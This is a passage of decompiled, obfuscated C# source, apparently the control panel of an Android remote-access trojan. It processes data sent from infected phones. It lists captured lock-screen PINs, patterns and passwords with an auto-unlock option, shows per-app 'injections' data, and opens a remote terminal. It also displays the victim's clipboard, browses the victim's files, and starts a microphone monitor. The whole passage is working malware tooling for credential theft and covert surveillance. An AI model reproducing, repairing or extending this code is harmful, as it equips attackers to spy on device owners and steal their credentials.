										CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Rows.Add("Captured Pin", text80, BTConst.autounlockbtnstr);
										break;
									}
								}
								if (CS_0024_003C_003E8__locals436._0024VB_0024Local_passcods.Contains("*"))
								{
									string[] array35 = CS_0024_003C_003E8__locals436._0024VB_0024Local_passcods.Split("*");
									foreach (string text81 in array35)
									{
										if (text81.Contains("|"))
										{
											string[] array36 = text81.Split('|');
											if (array36.Length == 2)
											{
												string text82 = array36[0];
												switch (array36[1])
												{
												case "1":
													CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Rows.Add("Pattern", text82, BTConst.autounlockbtnstr);
													break;
												case "2":
													CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Rows.Add("Pin", text82, BTConst.autounlockbtnstr);
													break;
												case "3":
													CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.DGV0.Rows.Add("Password", text82, BTConst.autounlockbtnstr);
													break;
												}
											}
										}
									}
								}
								CS_0024_003C_003E8__locals436._0024VB_0024Local_lockerform.switchlock(CS_0024_003C_003E8__locals436._0024VB_0024Local_islocked);
							}));
						}
						return;
					}
					catch (Exception ex25)
					{
						ProjectData.SetProjectError(ex25);
						Exception ex26 = ex25;
						Debuger.Log_e(EXGuarder._304B1A51, codes.EXtoString(ex26));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.jectcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D6 arg5 = default(_Closure_0024__15_002D6);
						_Closure_0024__15_002D6 CS_0024_003C_003E8__locals451 = new _Closure_0024__15_002D6(arg5);
						CS_0024_003C_003E8__locals451._0024VB_0024NonLocal__0024VB_0024Closure_5 = closure_0024__15_002D2;
						CS_0024_003C_003E8__locals451._0024VB_0024Local_classclient = GetClientById(CS_0024_003C_003E8__locals451._0024VB_0024NonLocal__0024VB_0024Closure_5._0024VB_0024Local_mobid);
						if (CS_0024_003C_003E8__locals451._0024VB_0024Local_classclient != null)
						{
							CS_0024_003C_003E8__locals451._0024VB_0024Local_handle = EXGuarder._553C6966 + CS_0024_003C_003E8__locals451._0024VB_0024NonLocal__0024VB_0024Closure_5._0024VB_0024Local_mobid;
							CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform = (injections)MyProject.Application.OpenForms[CS_0024_003C_003E8__locals451._0024VB_0024Local_handle];
							string text14 = dictionary3[EXGuarder._300B2D66].ToString();
							CS_0024_003C_003E8__locals451._0024VB_0024Local_jsonArray = JArray.Parse(text14);
							MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								if (CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform == null)
								{
									CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform = new injections();
									CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform.Tag = "jections" + CS_0024_003C_003E8__locals451._0024VB_0024NonLocal__0024VB_0024Closure_5._0024VB_0024Local_mobid;
									CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform.Name = CS_0024_003C_003E8__locals451._0024VB_0024Local_handle;
									CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform.myico.Image = CS_0024_003C_003E8__locals451._0024VB_0024Local_classclient.wallpaper;
									CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform.mytitle.Text = BTConst.injctstr + " | " + CS_0024_003C_003E8__locals451._0024VB_0024Local_classclient.name + " | " + CS_0024_003C_003E8__locals451._0024VB_0024Local_classclient.country;
									CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform.Show();
								}
								foreach (JObject item in CS_0024_003C_003E8__locals451._0024VB_0024Local_jsonArray)
								{
									string text79 = item["appId"].ToString();
									CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform.combojects.Items.Add(text79);
									JToken jToken = item["data"];
									string text80 = "";
									if (jToken is JArray)
									{
										foreach (JToken item2 in (IEnumerable<JToken>)jToken)
										{
											string text81 = (string?)item2;
											text80 = text80 + " - " + text81 + "\r\n";
										}
									}
									else
									{
										text80 = text80 + " - " + jToken.ToString() + "\r\n";
									}
									CS_0024_003C_003E8__locals451._0024VB_0024Local_jectform.jectlist.Add(text79, text80);
								}
							}));
							if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
							{
								codes.SaveJson(text14, CS_0024_003C_003E8__locals451._0024VB_0024Local_classclient.userfolder, EXGuarder._40533C0E, EXGuarder._45032C30);
							}
						}
						return;
					}
					catch (Exception ex27)
					{
						ProjectData.SetProjectError(ex27);
						Exception ex28 = ex27;
						Debuger.Log_e(EXGuarder._3E07012B, codes.EXtoString(ex28));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.netcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D7 arg4 = default(_Closure_0024__15_002D7);
						_Closure_0024__15_002D7 closure_0024__15_002D4 = new _Closure_0024__15_002D7(arg4);
						closure_0024__15_002D4._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
						if (closure_0024__15_002D4._0024VB_0024Local_classclient != null)
						{
							closure_0024__15_002D4._0024VB_0024Local_handle = EXGuarder._5E394D0E + closure_0024__15_002D2._0024VB_0024Local_mobid;
							closure_0024__15_002D4._0024VB_0024Local_terminalform = (terminal)MyProject.Application.OpenForms[closure_0024__15_002D4._0024VB_0024Local_handle];
							string left11 = dictionary3[EXGuarder._3C30123B].ToString();
							if (Operators.CompareString(left11, EXGuarder._445F2207, TextCompare: false) == 0)
							{
								_Closure_0024__15_002D8 arg6 = default(_Closure_0024__15_002D8);
								_Closure_0024__15_002D8 CS_0024_003C_003E8__locals462 = new _Closure_0024__15_002D8(arg6);
								CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6 = closure_0024__15_002D4;
								CS_0024_003C_003E8__locals462._0024VB_0024Local_andver = dictionary3[EXGuarder._22347106].ToString();
								CS_0024_003C_003E8__locals462._0024VB_0024Local_termtype = dictionary3[EXGuarder._553C4E66].ToString();
								if (Operators.CompareString(CS_0024_003C_003E8__locals462._0024VB_0024Local_termtype, EXGuarder._2423252B, TextCompare: false) == 0)
								{
									CS_0024_003C_003E8__locals462._0024VB_0024Local_termtype = EXGuarder._2423252B;
								}
								else if (Operators.CompareString(CS_0024_003C_003E8__locals462._0024VB_0024Local_termtype, EXGuarder._1D1A276A, TextCompare: false) == 0)
								{
									CS_0024_003C_003E8__locals462._0024VB_0024Local_termtype = EXGuarder._1D1A276A;
								}
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									if (CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform == null)
									{
										CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform = new terminal();
										CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.Name = CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_handle;
										CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.androidver = CS_0024_003C_003E8__locals462._0024VB_0024Local_andver;
										CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.mytype = CS_0024_003C_003E8__locals462._0024VB_0024Local_termtype;
										CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.BTcli = CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_classclient;
										CS_0024_003C_003E8__locals462._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.Show();
									}
								}));
							}
							else if (Operators.CompareString(left11, EXGuarder._68092F6B, TextCompare: false) == 0)
							{
								_Closure_0024__15_002D9 arg7 = default(_Closure_0024__15_002D9);
								_Closure_0024__15_002D9 CS_0024_003C_003E8__locals464 = new _Closure_0024__15_002D9(arg7);
								CS_0024_003C_003E8__locals464._0024VB_0024NonLocal__0024VB_0024Closure_7 = closure_0024__15_002D4;
								CS_0024_003C_003E8__locals464._0024VB_0024Local_response = dictionary3[EXGuarder._22347106].ToString();
								if (CS_0024_003C_003E8__locals464._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_terminalform != null)
								{
									CS_0024_003C_003E8__locals464._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_terminalform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										CS_0024_003C_003E8__locals464._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_terminalform.printterminal(CS_0024_003C_003E8__locals464._0024VB_0024Local_response);
									}));
								}
							}
						}
						return;
					}
					catch (Exception ex29)
					{
						ProjectData.SetProjectError(ex29);
						Exception ex30 = ex29;
						Debuger.Log_e(EXGuarder._4C3F2245, codes.EXtoString(ex30));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.trmcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D10 arg5 = default(_Closure_0024__15_002D10);
						_Closure_0024__15_002D10 closure_0024__15_002D5 = new _Closure_0024__15_002D10(arg5);
						closure_0024__15_002D5._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
						if (closure_0024__15_002D5._0024VB_0024Local_classclient != null)
						{
							closure_0024__15_002D5._0024VB_0024Local_handle = EXGuarder._5E394D0E + closure_0024__15_002D2._0024VB_0024Local_mobid;
							closure_0024__15_002D5._0024VB_0024Local_terminalform = (terminal)MyProject.Application.OpenForms[closure_0024__15_002D5._0024VB_0024Local_handle];
							string left12 = dictionary3[EXGuarder._3C30123B].ToString();
							if (Operators.CompareString(left12, EXGuarder._445F2207, TextCompare: false) == 0)
							{
								_Closure_0024__15_002D11 arg8 = default(_Closure_0024__15_002D11);
								_Closure_0024__15_002D11 CS_0024_003C_003E8__locals474 = new _Closure_0024__15_002D11(arg8);
								CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8 = closure_0024__15_002D5;
								CS_0024_003C_003E8__locals474._0024VB_0024Local_andver = dictionary3[EXGuarder._22347106].ToString();
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									if (CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform == null)
									{
										CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform = new terminal();
										CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.Name = CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_handle;
										CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.androidver = CS_0024_003C_003E8__locals474._0024VB_0024Local_andver;
										CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.mytype = "Normal";
										CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.BTcli = CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_classclient;
										CS_0024_003C_003E8__locals474._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.Show();
									}
								}));
							}
							else if (Operators.CompareString(left12, EXGuarder._68092F6B, TextCompare: false) == 0)
							{
								_Closure_0024__15_002D12 arg9 = default(_Closure_0024__15_002D12);
								_Closure_0024__15_002D12 CS_0024_003C_003E8__locals476 = new _Closure_0024__15_002D12(arg9);
								CS_0024_003C_003E8__locals476._0024VB_0024NonLocal__0024VB_0024Closure_9 = closure_0024__15_002D5;
								CS_0024_003C_003E8__locals476._0024VB_0024Local_response = dictionary3[EXGuarder._22347106].ToString();
								if (CS_0024_003C_003E8__locals476._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024Local_terminalform != null)
								{
									CS_0024_003C_003E8__locals476._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024Local_terminalform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										CS_0024_003C_003E8__locals476._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024Local_terminalform.printterminal(CS_0024_003C_003E8__locals476._0024VB_0024Local_response);
									}));
								}
							}
						}
						return;
					}
					catch (Exception ex31)
					{
						ProjectData.SetProjectError(ex31);
						Exception ex32 = ex31;
						Debuger.Log_e(EXGuarder._64136F54, codes.EXtoString(ex32));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.clipbordcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D13 arg10 = default(_Closure_0024__15_002D13);
						_Closure_0024__15_002D13 CS_0024_003C_003E8__locals489 = new _Closure_0024__15_002D13(arg10);
						CS_0024_003C_003E8__locals489._0024VB_0024NonLocal__0024VB_0024Closure_10 = closure_0024__15_002D2;
						CS_0024_003C_003E8__locals489._0024VB_0024Local_classclient = GetClientById(CS_0024_003C_003E8__locals489._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_mobid);
						if (CS_0024_003C_003E8__locals489._0024VB_0024Local_classclient != null)
						{
							CS_0024_003C_003E8__locals489._0024VB_0024Local_handle = EXGuarder._1540245C + CS_0024_003C_003E8__locals489._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_mobid;
							CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform = (Clipboard)MyProject.Application.OpenForms[CS_0024_003C_003E8__locals489._0024VB_0024Local_handle];
							CS_0024_003C_003E8__locals489._0024VB_0024Local_clipdata = dictionary3[EXGuarder._402C5026].ToString();
							MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								if (CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform == null)
								{
									CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform = new Clipboard();
									CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform.Tag = "Clips" + CS_0024_003C_003E8__locals489._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_mobid;
									CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform.Name = CS_0024_003C_003E8__locals489._0024VB_0024Local_handle;
									CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform.mobid = CS_0024_003C_003E8__locals489._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_mobid;
									CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform.WSClient = CS_0024_003C_003E8__locals489._0024VB_0024Local_classclient.Serverins.WSClient;
									CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform.Show();
								}
								CS_0024_003C_003E8__locals489._0024VB_0024Local_clipform.logclipboard.Text = CS_0024_003C_003E8__locals489._0024VB_0024Local_clipdata;
							}));
						}
						return;
					}
					catch (Exception ex33)
					{
						ProjectData.SetProjectError(ex33);
						Exception ex34 = ex33;
						Debuger.Log_e(EXGuarder._211C2A75, codes.EXtoString(ex34));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.alrtusrcom, TextCompare: false) == 0)
				{
					try
					{
						string text15 = dictionary3[EXGuarder._1762580D].ToString();
						if (!text15.StartsWith(EXGuarder._0A336309))
						{
							string msg = dictionary3[EXGuarder._75106764].ToString();
							BTClient clientById5 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (clientById5 != null)
							{
								MainForm.insertnotification(clientById5, text15, msg);
							}
						}
						return;
					}
					catch (Exception ex35)
					{
						ProjectData.SetProjectError(ex35);
						Exception ex36 = ex35;
						Debuger.Log_e(EXGuarder._0D160930, codes.EXtoString(ex36));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.files, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D14 arg11 = default(_Closure_0024__15_002D14);
						_Closure_0024__15_002D14 CS_0024_003C_003E8__locals520 = new _Closure_0024__15_002D14(arg11);
						CS_0024_003C_003E8__locals520._0024VB_0024NonLocal__0024VB_0024Closure_11 = closure_0024__15_002D2;
						List<Dictionary<string, object>> list = BTCommand.ParsefilesData(dictionary3[EXGuarder._08033105].ToString());
						CS_0024_003C_003E8__locals520._0024VB_0024Local_handle = EXGuarder._38310548 + CS_0024_003C_003E8__locals520._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager = (filesmanager)MyProject.Application.OpenForms[CS_0024_003C_003E8__locals520._0024VB_0024Local_handle];
						CS_0024_003C_003E8__locals520._0024VB_0024Local_classclient = GetClientById(CS_0024_003C_003E8__locals520._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_mobid);
						if (CS_0024_003C_003E8__locals520._0024VB_0024Local_classclient != null)
						{
							MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								if (CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager == null)
								{
									CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager = new filesmanager();
									CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.Tag = "Files" + CS_0024_003C_003E8__locals520._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_mobid;
									CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.Name = CS_0024_003C_003E8__locals520._0024VB_0024Local_handle;
									CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.Btcli = CS_0024_003C_003E8__locals520._0024VB_0024Local_classclient;
									CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.Tag = "";
									CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.ListViewItemSorter = null;
									CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.Show();
								}
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.emptytext.Visible = false;
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.emptytext.SendToBack();
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.BeginUpdate();
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.ClearObjects();
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.baseloader.Enabled = false;
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.baseloader.Visible = false;
							}));
							int num = 0;
							Dictionary<string, object> dictionary6 = list[0];
							CS_0024_003C_003E8__locals520._0024VB_0024Local_fileRows = new List<filesmanager.FileRow>();
							CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.isloading = true;
							if (dictionary6 != null && dictionary6[EXGuarder._2C3D4965] != null && dictionary6[EXGuarder._1D402C16] != null && Operators.CompareString(dictionary6[EXGuarder._2C3D4965].ToString(), EXGuarder._25676E1D, TextCompare: false) != 0 && Operators.CompareString(dictionary6[EXGuarder._1D402C16].ToString(), EXGuarder._25676E1D, TextCompare: false) != 0)
							{
								_Closure_0024__15_002D15 arg6 = default(_Closure_0024__15_002D15);
								_Closure_0024__15_002D15 closure_0024__15_002D6 = new _Closure_0024__15_002D15(arg6);
								closure_0024__15_002D6._0024VB_0024NonLocal__0024VB_0024Closure_12 = CS_0024_003C_003E8__locals520;
								if (double.TryParse(dictionary6[EXGuarder._2C3D4965].ToString(), out closure_0024__15_002D6._0024VB_0024Local_storeusedValue) && double.TryParse(dictionary6[EXGuarder._1D402C16].ToString(), out closure_0024__15_002D6._0024VB_0024Local_storesizeValue))
								{
									_Closure_0024__15_002D16 arg12 = default(_Closure_0024__15_002D16);
									_Closure_0024__15_002D16 CS_0024_003C_003E8__locals511 = new _Closure_0024__15_002D16(arg12);
									CS_0024_003C_003E8__locals511._0024VB_0024NonLocal__0024VB_0024Closure_13 = closure_0024__15_002D6;
									CS_0024_003C_003E8__locals511._0024VB_0024Local_percentageUsed = (int)Math.Round(Math.Min(CS_0024_003C_003E8__locals511._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_storeusedValue / CS_0024_003C_003E8__locals511._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_storesizeValue * 100.0, 100.0));
									CS_0024_003C_003E8__locals511._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_FileManager.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										CS_0024_003C_003E8__locals511._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_FileManager.usagetitle.Text = $"Storage : {CS_0024_003C_003E8__locals511._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_storeusedValue} GB of {CS_0024_003C_003E8__locals511._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_storesizeValue} GB used";
										CS_0024_003C_003E8__locals511._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_FileManager.usageprecent.Value = CS_0024_003C_003E8__locals511._0024VB_0024Local_percentageUsed;
									}));
								}
							}
							CS_0024_003C_003E8__locals520._0024VB_0024Local_stringtagpath = EXGuarder._121E6943;
							bool flag3 = BTRegistry.ReadBool(EXGuarder._6C503812);
							bool flag4 = BTRegistry.ReadBool(EXGuarder._313B2730);
							int num2 = list.Count - 1;
							_Closure_0024__15_002D17 closure_0024__15_002D7 = default(_Closure_0024__15_002D17);
							for (int num3 = 0; num3 <= num2; num3++)
							{
								closure_0024__15_002D7 = new _Closure_0024__15_002D17(closure_0024__15_002D7);
								closure_0024__15_002D7._0024VB_0024NonLocal__0024VB_0024Closure_14 = CS_0024_003C_003E8__locals520;
								closure_0024__15_002D7._0024VB_0024Local_file = list[num3];
								if (closure_0024__15_002D7._0024VB_0024Local_file == null || Operators.CompareString(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._5C705F58].ToString(), EXGuarder._766C3464, TextCompare: false) == 0)
								{
									if (closure_0024__15_002D7._0024VB_0024Local_file != null && closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._095A6902] != null)
									{
										closure_0024__15_002D7._0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_FileManager.Invoke(new VB_0024AnonymousDelegate_0(closure_0024__15_002D7._Lambda_0024__14));
									}
								}
								else
								{
									closure_0024__15_002D7._0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_stringtagpath = Conversions.ToString(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._095A6902]);
									string text16 = EXGuarder._121E6943;
									if (closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._5C705F58].ToString().Contains(EXGuarder._29257718))
									{
										text16 = closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._5C705F58].ToString().Substring(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._5C705F58].ToString().LastIndexOf(EXGuarder._29257718));
									}
									Bitmap bitmap5 = null;
									try
									{
										bitmap5 = (Operators.ConditionalCompareObjectEqual(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._29444245], EXGuarder._25676E1D, TextCompare: false) ? Nativz.GetIcon(MyRes.Resources_Path, LargeIco: true) : Nativz.GetFileIcon(text16));
									}
									catch (Exception ex37)
									{
										ProjectData.SetProjectError(ex37);
										Exception ex38 = ex37;
										bitmap5 = (Bitmap)Resources.info_blue.Clone();
										ProjectData.ClearProjectError();
									}
									filesmanager.FileRow fileRow = new filesmanager.FileRow();
									fileRow.Name = closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._5C705F58].ToString();
									Bitmap icon;
									if (bitmap5 != null)
									{
										try
										{
											icon = (Bitmap)bitmap5.Clone();
										}
										catch (Exception ex39)
										{
											ProjectData.SetProjectError(ex39);
											Exception ex40 = ex39;
											icon = new Bitmap(1, 1);
											ProjectData.ClearProjectError();
										}
									}
									else
									{
										icon = new Bitmap(1, 1);
									}
									fileRow.Icon = icon;
									int num4 = ((closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._39086A6F] != null && Operators.ConditionalCompareObjectNotEqual(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._39086A6F], -1, TextCompare: false)) ? Conversions.ToInteger(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._39086A6F]) : 0);
									if (Conversions.ToInteger(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._29444245]) == 1)
									{
										if (flag4 && Operators.ConditionalCompareObjectEqual(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._6A406C65], 0, TextCompare: false))
										{
											continue;
										}
										fileRow.IsFile = true;
										fileRow.TypeDescription = string.Format(EXGuarder._38696724, text16);
										fileRow.SizeDescription = codes.BytesToText(Conversions.ToLong(closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._6A406C65]));
									}
									else
									{
										if (num4 == 0 && flag3)
										{
											continue;
										}
										fileRow.IsFile = false;
										fileRow.TypeDescription = string.Format(EXGuarder._2B221220, num4);
										fileRow.SizeDescription = EXGuarder._18072D47;
									}
									fileRow.ModifiedDate = closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._324E734B].ToString();
									fileRow.CreateDate = closure_0024__15_002D7._0024VB_0024Local_file[EXGuarder._71465A27].ToString();
									closure_0024__15_002D7._0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_fileRows.Add(fileRow);
									closure_0024__15_002D7._0024VB_0024Local_parvalue = codes.RateConverter(num, list.Count - 1);
									closure_0024__15_002D7._0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_FileManager.Invoke(new VB_0024AnonymousDelegate_0(closure_0024__15_002D7._Lambda_0024__15));
									num++;
								}
							}
							CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.Tag = CS_0024_003C_003E8__locals520._0024VB_0024Local_stringtagpath;
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.PBtitlebar.Value = 0;
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.SetObjects(CS_0024_003C_003E8__locals520._0024VB_0024Local_fileRows);
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.EndUpdate();
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.isloading = false;
								CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.pathtxt.Text = Conversions.ToString(CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.Tag);
							}));
							if (CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.visited.ContainsKey(Conversions.ToString(CS_0024_003C_003E8__locals520._0024VB_0024Local_FileManager.listfilesvew.Tag)))
							{
								_Closure_0024__15_002D18 arg13 = default(_Closure_0024__15_002D18);
								_Closure_0024__15_002D18 CS_0024_003C_003E8__locals524 = new _Closure_0024__15_002D18(arg13);
								CS_0024_003C_003E8__locals524._0024VB_0024NonLocal__0024VB_0024Closure_15 = CS_0024_003C_003E8__locals520;
								CS_0024_003C_003E8__locals524._0024VB_0024Local_lastindexclick = Conversions.ToInteger(CS_0024_003C_003E8__locals524._0024VB_0024NonLocal__0024VB_0024Closure_15._0024VB_0024Local_FileManager.visited[Conversions.ToString(CS_0024_003C_003E8__locals524._0024VB_0024NonLocal__0024VB_0024Closure_15._0024VB_0024Local_FileManager.listfilesvew.Tag)]);
								if (CS_0024_003C_003E8__locals524._0024VB_0024Local_lastindexclick >= 0 && CS_0024_003C_003E8__locals524._0024VB_0024Local_lastindexclick < CS_0024_003C_003E8__locals524._0024VB_0024NonLocal__0024VB_0024Closure_15._0024VB_0024Local_FileManager.listfilesvew.Items.Count)
								{
									CS_0024_003C_003E8__locals524._0024VB_0024NonLocal__0024VB_0024Closure_15._0024VB_0024Local_FileManager.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										CS_0024_003C_003E8__locals524._0024VB_0024NonLocal__0024VB_0024Closure_15._0024VB_0024Local_FileManager.listfilesvew.Items[CS_0024_003C_003E8__locals524._0024VB_0024Local_lastindexclick].Selected = true;
										CS_0024_003C_003E8__locals524._0024VB_0024NonLocal__0024VB_0024Closure_15._0024VB_0024Local_FileManager.listfilesvew.EnsureVisible(CS_0024_003C_003E8__locals524._0024VB_0024Local_lastindexclick);
									}));
								}
							}
						}
						return;
					}
					catch (Exception ex41)
					{
						ProjectData.SetProjectError(ex41);
						Exception ex42 = ex41;
						Debuger.Log_e(EXGuarder._1C6A110F, codes.EXtoString(ex42));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.Micrphonecom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D19 arg14 = default(_Closure_0024__15_002D19);
						_Closure_0024__15_002D19 CS_0024_003C_003E8__locals525 = new _Closure_0024__15_002D19(arg14);
						string name3 = EXGuarder._3A493B07 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals525._0024VB_0024Local_micform = (MicMonitor)MyProject.Application.OpenForms[name3];
